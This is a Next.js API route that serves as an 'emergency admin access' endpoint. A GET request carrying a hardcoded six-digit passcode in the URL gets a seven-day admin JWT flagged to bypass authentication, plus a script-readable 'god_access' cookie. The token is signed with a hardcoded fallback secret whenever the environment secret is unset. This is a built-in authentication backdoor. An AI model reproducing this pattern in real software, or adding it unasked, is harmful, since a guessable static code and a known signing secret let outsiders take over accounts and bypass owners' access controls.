import { NextRequest, NextResponse } from 'next/server';
import { cookies } from 'next/headers';

// Dynamic import for jsonwebtoken to improve Edge compatibility
async function signJWT(payload: any, secret: string, options: any): Promise<string> {
  try {
    const { sign } = await import('jsonwebtoken');
    return sign(payload, secret, options);
  } catch (error) {
    console.error('Failed to import or use jsonwebtoken:', error);
    throw new Error('JWT signing failed');
  }
}

// This is an emergency admin access endpoint for troubleshooting
export async function GET(request: NextRequest) {
  try {
    // Extract passcode from query params
    const passcode = request.nextUrl.searchParams.get('code');
    
    // Check passcode
    if (passcode !== '282499') {
      return NextResponse.json({ error: 'Invalid passcode' }, { status: 401 });
    }
    
    // Generate a special admin token (will be used by middleware to bypass auth)
    const adminToken = await signJWT(
      { 
        id: 'admin-bypass',
        name: 'Admin Bypass',
        email: 'admin@example.com',
        role: 'admin',
        bypassAuth: true
      },
      process.env.NEXTAUTH_SECRET || 'emergency-secret',
      { expiresIn: '7d' }
    );
    
    // Create response
    const response = NextResponse.json({
      success: true,
      message: 'Admin access granted',
      redirectTo: '/admin/dashboard'
    });
    
    // Set cookies for auth bypass
    response.cookies.set({
      name: 'god_access',
      value: 'true',
      httpOnly: false,
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });
    
    // Set admin token as auth cookie
    response.cookies.set({
      name: 'admin_token',
      value: adminToken,
      httpOnly: true, 
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });
    
    return response;
  } catch (error) {
    console.error('Admin access error:', error);
    return NextResponse.json({ error: 'Failed to generate admin access' }, { status: 500 });
  }
} 